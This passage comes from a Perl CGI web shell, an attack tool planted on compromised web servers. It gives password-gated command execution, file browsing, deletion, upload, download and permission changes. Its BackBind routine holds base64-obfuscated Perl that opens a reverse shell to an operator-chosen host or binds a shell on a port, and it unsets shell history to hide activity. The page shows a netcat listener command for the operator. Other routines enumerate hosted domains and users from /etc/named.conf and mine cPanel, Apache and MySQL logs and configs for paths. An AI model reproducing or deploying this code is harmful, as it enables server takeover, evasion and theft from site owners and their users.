	<td> Host: <input type="text" size="20" name="clientaddr" value="$ENV{'REMOTE_ADDR'}">
	 Port: <input type="text" size="6" name="clientport" value="80" onkeyup="document.getElementById('ba').innerHTML=this.value;"></td>

	<td><input name="s" class="submit" type="submit" name="submit" value="Connect"></td>
	</form>
	</tr>
	<tr>
	<td colspan=3><font color=#FFFFFF>[+] Client listen before connect back!
	<br>[+] Try check your Port with <a target="_blank" href="http://www.canyouseeme.org/">http://www.canyouseeme.org/</a>
	<br>[+] Client listen with command: <run>nc -vv -l -p <span id="ba">80</span></run></font></td>

	</tr>
	</table>

	<br><br>
	<table>
	<tr>
	<form method="POST" action="$ScriptLocation">
	<td>Bind Port: <input type="hidden" name="a" value="backbind"></td>

	<td> Port: <input type="text" size="15" name="clientport" value="1412" onkeyup="document.getElementById('bi').innerHTML=this.value;">

	 Password: <input type="text" size="12" name="bindpass" value="vinakid"></td>
	<td><input name="s" class="submit" type="submit" name="submit" value="Bind"></td>
	</form>
	</tr>
	<tr>
	<td colspan=3><font color=#FFFFFF>[+] Testing ....
	<br>[+] Try command: <run>nc $ENV{'SERVER_ADDR'} <span id="bi">1412</span></run></font></td>

	</tr>
	</table><br>
END
}
#------------------------------------------------------------------------------
# Backconnect use perl
#------------------------------------------------------------------------------
sub BackBind
{
	use Socket;	
	$backperl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgSU86OlNvY2tldDsNCiRTaGVsbAk9ICIvYmluL2Jhc2giOw0KJEFSR0M9QEFSR1Y7DQp1c2UgU29ja2V0Ow0KdXNlIEZpbGVIYW5kbGU7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgZ2V0cHJvdG9ieW5hbWUoInRjcCIpKSBvciBkaWUgcHJpbnQgIlstXSBVbmFibGUgdG8gUmVzb2x2ZSBIb3N0XG4iOw0KY29ubmVjdChTT0NLRVQsIHNvY2thZGRyX2luKCRBUkdWWzFdLCBpbmV0X2F0b24oJEFSR1ZbMF0pKSkgb3IgZGllIHByaW50ICJbLV0gVW5hYmxlIHRvIENvbm5lY3QgSG9zdFxuIjsNCnByaW50ICJDb25uZWN0ZWQhIjsNClNPQ0tFVC0+YXV0b2ZsdXNoKCk7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCI+JlNPQ0tFVCIpOw0Kb3BlbihTVERFUlIsIj4mU09DS0VUIik7DQpwcmludCAiLS09PSBDb25uZWN0ZWQgQmFja2Rvb3IgPT0tLSAgXG5cbiI7DQpzeXN0ZW0oInVuc2V0IEhJU1RGSUxFOyB1bnNldCBTQVZFSElTVCA7ZWNobyAnWytdIFN5c3RlbWluZm86ICc7IHVuYW1lIC1hO2VjaG87ZWNobyAnWytdIFVzZXJpbmZvOiAnOyBpZDtlY2hvO2VjaG8gJ1srXSBEaXJlY3Rvcnk6ICc7IHB3ZDtlY2hvOyBlY2hvICdbK10gU2hlbGw6ICc7JFNoZWxsIik7DQpjbG9zZSBTT0NLRVQ7";
	$bindperl="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJEFSR0M9QEFSR1Y7DQokcG9ydAk9ICRBUkdWWzBdOw0KJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3RjcCcpOw0KJFNoZWxsCT0gIi9iaW4vYmFzaCI7DQpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKW9yIGRpZSAic29ja2V0OiQhIjsNCnNldHNvY2tvcHQoU0VSVkVSLCBTT0xfU09DS0VULCBTT19SRVVTRUFERFIsIHBhY2soImwiLCAxKSlvciBkaWUgInNldHNvY2tvcHQ6ICQhIjsNCmJpbmQoU0VSVkVSLCBzb2NrYWRkcl9pbigkcG9ydCwgSU5BRERSX0FOWSkpb3IgZGllICJiaW5kOiAkISI7DQpsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pCQlvciBkaWUgImxpc3RlbjogJCEiOw0KZm9yKDsgJHBhZGRyID0gYWNjZXB0KENMSUVOVCwgU0VSVkVSKTsgY2xvc2UgQ0xJRU5UKQ0Kew0KCW9wZW4oU1RESU4sICI+JkNMSUVOVCIpOw0KCW9wZW4oU1RET1VULCAiPiZDTElFTlQiKTsNCglvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7DQoJc3lzdGVtKCJ1bnNldCBISVNURklMRTsgdW5zZXQgU0FWRUhJU1QgO2VjaG8gJ1srXSBTeXN0ZW1pbmZvOiAnOyB1bmFtZSAtYTtlY2hvO2VjaG8gJ1srXSBVc2VyaW5mbzogJzsgaWQ7ZWNobztlY2hvICdbK10gRGlyZWN0b3J5OiAnOyBwd2Q7ZWNobzsgZWNobyAnWytdIFNoZWxsOiAnOyRTaGVsbCIpOw0KCWNsb3NlKFNURElOKTsNCgljbG9zZShTVERPVVQpOw0KCWNsb3NlKFNUREVSUik7DQp9DQo=";

	$ClientAddr = $in{'clientaddr'};
	$ClientPort = int($in{'clientport'});
	if($ClientPort eq 0)
	{
		return &BackBindForm;
	}elsif(!$ClientAddr eq "")
	{
		$Data=decode_base64($backperl);
		if(-w "/tmp/")
		{
			$File="/tmp/backconnect.pl";	
		}else
		{
			$File=$CurrentDir.$PathSep."backconnect.pl";
		}
		open(FILE, ">$File");
		print FILE $Data;
		close FILE;
		system("perl $File $ClientAddr $ClientPort");
		unlink($File);
		exit 0;
	}else
	{
		$Data=decode_base64($bindperl);
		if(-w "/tmp")
		{
			$File="/tmp/bindport.pl";	
		}else
		{
			$File=$CurrentDir.$PathSep."bindport.pl";
		}
		open(FILE, ">$File");
		print FILE $Data;
		close FILE;
		system("perl $File $ClientPort");
		unlink($File);
		exit 0;
	}
}
#------------------------------------------------------------------------------
#  Array List Directory
#------------------------------------------------------------------------------
sub RmDir($) 
{
	my $dir = shift;
	if(opendir(DIR,$dir))
	{
		while($file = readdir(DIR))
		{
			if(($file ne ".") && ($file ne ".."))
			{
				$file= $dir.$PathSep.$file;
				if(-d $file)
				{
					&RmDir($file);
				}
				else
				{
					unlink($file);
				}
			}
		}
		closedir(DIR);
	}
}
sub FileOwner($)
{
	my $file = shift;
	if(-e $file)
	{
		($uid,$gid) = (stat($file))[4,5];
		if($WinNT)
		{
			return "???";
		}
		else
		{
			$name=getpwuid($uid);
			$group=getgrgid($gid);
			return $name."/".$group;
		}
	}
	return "???";
}
sub ParentFolder($)
{
	my $path = shift;
	my $Comm = "cd \"$CurrentDir\"".$CmdSep."cd ..".$CmdSep.$CmdPwd;
	chop($path = `$Comm`);
	return $path;
}
sub FilePerms($)
{
	my $file = shift;
	my $ur = "-";
	my $uw = "-";
	if(-e $file)
	{
		if($WinNT)
		{
			if(-r $file){ $ur = "r"; }
			if(-w $file){ $uw = "w"; }
			return $ur . " / " . $uw;
		}else
		{
			$mode=(stat($file))[2];
			$result = sprintf("%04o", $mode & 07777);
			return $result;
		}
	}
	return "0000";
}
sub FileLastModified($)
{
	my $file = shift;
	if(-e $file)
	{
		($la) = (stat($file))[9];
		($d,$m,$y,$h,$i) = (localtime($la))[3,4,5,2,1];
		$y = $y + 1900;
		@month = qw/1 2 3 4 5 6 7 8 9 10 11 12/;
		$lmtime = sprintf("%02d/%s/%4d %02d:%02d",$d,$month[$m],$y,$h,$i);
		return $lmtime;
	}
	return "???";
}
sub FileSize($)
{
	my $file = shift;
	if(-f $file)
	{
		return -s "$file";
	}
	return "0";
}
sub ParseFileSize($)
{
	my $size = shift;
	if($size <= 1024)
	{
		return $size. " B";
	}
	else
	{
		if($size <= 1024*1024) 
		{
			$size = sprintf("%.02f",$size / 1024);
			return $size." KB";
		}
		else 
		{
			$size = sprintf("%.2f",$size / 1024 / 1024);
			return $size." MB";
		}
	}
}
sub trim($)
{
	my $string = shift;
	$string =~ s/^\s+//;
	$string =~ s/\s+$//;
	return $string;
}
sub AddSlashes($)
{
	my $string = shift;
	$string=~ s/\\/\\\\/g;
	return $string;
}
sub TrimSlashes($)
{
	my $string = shift;
	$string=~ s/\/\//\//g;
	$string=~ s/\\\\/\\/g;
	return $string;
}
sub ListDir
{
	my $path = &TrimSlashes($CurrentDir.$PathSep);
	my $result = "<form name='f' onSubmit=\"Encoder('d')\" action='$ScriptLocation'><span style='font: 8pt Verdana; font-weight: bold;'>Path: [ ".&AddLinkDir("gui")." ] </span><input type='text' id='d' name='d' size='70' value='$CurrentDir' /><input type='hidden' name='a' value='gui'><input class='submit' type='submit' value='Change'></form>";
	if(-d $path)
	{
		my @fname = ();
		my @dname = ();
		if(opendir(DIR,$path))
		{
			while($file = readdir(DIR))
			{
				$f=$path.$file;
				if(-d $f)
				{
					push(@dname,$file);
				}
				else
				{
					push(@fname,$file);
				}
			}
			closedir(DIR);
		}
		@fname = sort { lc($a) cmp lc($b) } @fname;
		@dname = sort { lc($a) cmp lc($b) } @dname;
		$result .= "<div><table width='90%' class='listdir'>
		<tr style='background-color: #3e3e3e'><th>File Name</th>
		<th width='100'>File Size</th>
		<th width='150'>Owner</th>
		<th width='100'>Permission</th>
		<th width='150'>Last Modified</th>
		<th width='230'>Action</th></tr>";
		my $style="notline";
		my $i=0;
		foreach my $d (@dname)
		{
			$style= ($style eq "line") ? "notline": "line";
			$d = &trim($d);
			$dirname=$d;
			if($d eq "..") 
			{
				$d = &ParentFolder($path);
			}
			elsif($d eq ".") 
			{
				next;
			}
			else 
			{
				$d = $path.$d;
			}
			$result .= "<tr class='$style'><td id='File_$i' class='dir'><a  href='?a=gui&d=".&EncodeDir($d)."'>[ ".$dirname." ]</a></td>";
			$result .= "<td>DIR</td>";
			$result .= "<td>".&FileOwner($d)."</td>";
			$result .= "<td id='FilePerms_$i' ondblclick=\"rm_chmod_form(this,".$i.",'".&FilePerms($d)."','".$dirname."')\" ><span onclick=\"chmod_form(".$i.",'".$dirname."')\" >".&FilePerms($d)."</span></td>";
			$result .= "<td>".&FileLastModified($d)."</td>";
			$result .= "<td><a onclick=\"rename_form($i,'$dirname','".&AddSlashes(&AddSlashes($d))."'); return false; \">Rename</a>  | <a onclick=\"if(!confirm('Remove dir: $dirname ?')) { return false;}\" href='?a=gui&d=".&EncodeDir($path)."&remove=$dirname'>Remove</a></td>";
			$result .= "</tr>";
			$i++;
		}
		foreach my $f (@fname)
		{
			$style= ($style eq "line") ? "notline": "line";
			$file=$f;
			$f = $path.$f;
			my $action = encode_base64("edit ".$file);
			$view = "?dir=".$path."&view=".$f;
			$result .= "<tr class='$style'><td id='File_$i' class='file'><a href='?a=command&d=".&EncodeDir($path)."&c=".$action."'>".$file."</a></td>";
			$result .= "<td>".&ParseFileSize(&FileSize($f))."</td>";
			$result .= "<td>".&FileOwner($f)."</td>";
			$result .= "<td id='FilePerms_$i' ondblclick=\"rm_chmod_form(this,".$i.",'".&FilePerms($f)."','".$file."')\" ><span onclick=\"chmod_form($i,'$file')\" >".&FilePerms($f)."</span></td>";
			$result .= "<td>".&FileLastModified($f)."</td>";
			$result .= "<td><a onclick=\"rename_form($i,'$file','f'); return false;\">Rename</a> | <a href='?a=download&o=go&f=".$f."'>Download</a> | <a onclick=\"if(!confirm('Remove file: $file ?')) { return false;}\" href='?a=gui&d=".&EncodeDir($path)."&remove=$file'>Remove</a></td>";
			$result .= "</tr>";
			$i++;
		}
		$result .= "</table></div>";
	}
	return $result;
}
#------------------------------------------------------------------------------
# Try to View List User
#------------------------------------------------------------------------------
sub ViewDomainUser
{
	open (d0mains, '/etc/named.conf') or $err=1;
	my @cnzs = <d0mains>;
	close d0mains;
	my $style="line";
	my $result="<center><h3><font style='font: 15pt Verdana;color: #25383C;'>Hacker Sakit Hati</font></h3><center/>";
	if ($err)
	{
		$result .=  ('<p>C0uldn\'t Bypass it , Sorry</p>');
		return $result;
	}else
	{
		$result .= '<table id="domain"><tr><th>d0mains</th> <th>User</th></tr>';
	}
	foreach my $one (@cnzs)
	{
		if($one =~ m/.*?zone "(.*?)" {/)
		{	
			$style= ($style eq "line") ? "notline": "line";
			$filename= trim("/etc/valiases/".$1);
			$owner = getpwuid((stat($filename))[4]);
			$result .= '<tr style="$style" width=50%><td><a href="http://'.$1.'" target="_blank">'.$1.'</a></td><td> '.$owner.'</td></tr>';
		}
	}
	$result .= '</table>';
	return $result;
}
#------------------------------------------------------------------------------
# View Log
#------------------------------------------------------------------------------
sub ViewLog
{
	$EncodeCurrentDir = EncodeDir($CurrentDir);
	if($WinNT)
	{
		return "<h2><font style='font: 20pt Verdana;color: #25383C;'>Don't run on Windows</font></h2>";
	}
	my $result="<table><tr><th>Path Log</th><th>Submit</th></tr>";
	my @pathlog=(	'/usr/local/apache/logs/error_log',
			'/usr/local/apache/logs/access_log',
			'/usr/local/apache2/conf/httpd.conf',
			'/var/log/httpd/error_log',
			'/var/log/httpd/access_log',
			'/usr/local/cpanel/logs/error_log',
			'/usr/local/cpanel/logs/access_log',
			'/usr/local/apache/logs/suphp_log',
			'/usr/local/cpanel/logs',
			'/usr/local/cpanel/logs/stats_log',
			'/usr/local/cpanel/logs/access_log',
			'/usr/local/cpanel/logs/error_log',
			'/usr/local/cpanel/logs/license_log',
			'/usr/local/cpanel/logs/login_log',
			'/usr/local/cpanel/logs/stats_log',
			'/var/cpanel/cpanel.config',
			'/usr/local/php/lib/php.ini',
			'/usr/local/php5/lib/php.ini',
			'/var/log/mysql/mysql-bin.log',
			'/var/log/mysql.log',
			'/var/log/mysqlderror.log',
			'/var/log/mysql/mysql.log',
			'/var/log/mysql/mysql-slow.log',
			'/var/mysql.log',
			'/var/lib/mysql/my.cnf',
			'/etc/mysql/my.cnf',
			'/etc/my.cnf',
			);
	my $i=0;
	my $perms;
	my $sl;
	foreach my $log (@pathlog)
	{
		if(-r $log)
		{
			$perms="OK";
		}else
		{
			$perms="<font style='color: red;'>Cancel<font>";
		}
		$result .=<<END;
		<tr>

			<form action="" method="post" onSubmit="Encoder('log$i')">
			<td><input type="text" id="log$i" name="c" value="tail -10000 $log | grep '/home'" size='50'/></td>
			<td><input class="submit" type="submit" value="Try" /></td>
			<input type="hidden" name="a" value="command" />
			<input type="hidden" name="d" value="$EncodeCurrentDir" />
			</form>
			<td>$perms</td>

		</tr>
END
		$i++;
	}
	$result .="</table>";
	return $result;
}
#------------------------------------------------------------------------------
# Main Program - Execution Starts Here
#------------------------------------------------------------------------------
&ReadParse;
&GetCookies;

$ScriptLocation = $ENV{'SCRIPT_NAME'};
$ServerName = $ENV{'SERVER_NAME'};
$LoginPassword = $in{'p'};
$RunCommand = decode_base64($in{'c'});
$TransferFile = $in{'f'};
$Options = $in{'o'};
$Action = $in{'a'};

$Action = "command" if($Action eq ""); # no action specified, use default

# get the directory in which the commands will be executed
$CurrentDir = &TrimSlashes(decode_base64(trim($in{'d'})));
# mac dinh xuat thong tin neu ko co lenh nao!
$RunCommand= $WinNT?"dir":"dir -lia" if($RunCommand eq "");
chomp($CurrentDir = `$CmdPwd`) if($CurrentDir eq "");

$LoggedIn = $Cookies{'SAVEDPWD'} eq $Password;

if($Action eq "login" || !$LoggedIn) 		# user needs/has to login
{
	&PerformLogin;
}elsif($Action eq "gui") # GUI directory
{
	&PrintPageHeader("d");
	if(!$WinNT)
	{
		$chmod=int($in{'chmod'});
		if($chmod ne 0)
		{
			$chmod=int($in{'chmod'});
			$file=$CurrentDir.$PathSep.$TransferFile;
			if(chmod($chmod,$file))
			{
				print "<run> Done! </run><br>";
			}else
			{
				print "<run> Sorry! You dont have permissions! </run><br>";
			}
		}
	}
	$rename=$in{'rename'};
	if($rename ne "")
	{
		if(rename($TransferFile,$rename))
		{
			print "<run> Done! </run><br>";
		}else
		{
			print "<run> Sorry! You dont have permissions! </run><br>";
		}
	}
	$remove=$in{'remove'};
	if($remove ne "")
	{
		$rm = $CurrentDir.$PathSep.$remove;
		if(-d $rm)
		{
			&RmDir($rm);
		}else
		{
			if(unlink($rm))
			{
				print "<run> Done! </run><br>";
			}else
			{
				print "<run> Sorry! You dont have permissions! </run><br>";
			}			
		}
	}
	print &ListDir;

}
elsif($Action eq "command")				 	# user wants to run a command
{
	&PrintPageHeader("c");
	print &ExecuteCommand;
}
elsif($Action eq "save")				 	# user wants to save a file
{
	&PrintPageHeader;
	if(&SaveFile($in{'data'},$in{'file'}))
	{
		print "<run> Done! </run><br>";
	}else
	{
		print "<run> Sorry! You dont have permissions! </run><br>";
	}
	print &ListDir;
}elsif($Action eq "upload") 					# user wants to upload a file
{
	&PrintPageHeader("c");
	print &UploadFile;
}elsif($Action eq "backbind") 				# user wants to back connect or bind port
{
	&PrintPageHeader("clientport");
	print &BackBind;
}elsif($Action eq "bruteforcer") 			# user wants to brute force
{
	&PrintPageHeader;
	print &BruteForcer;
}elsif($Action eq "download") 				# user wants to download a file
{
	print &DownloadFile;
}elsif($Action eq "checklog") 				# user wants to view log file
{
	&PrintPageHeader;
	print &ViewLog;

}elsif($Action eq "domainsuser") 			# user wants to view list user/domain
{
	&PrintPageHeader;
	print &ViewDomainUser;
}elsif($Action eq "logout") 				# user wants to logout
{
	&PerformLogout;
}
&PrintPageFooter;
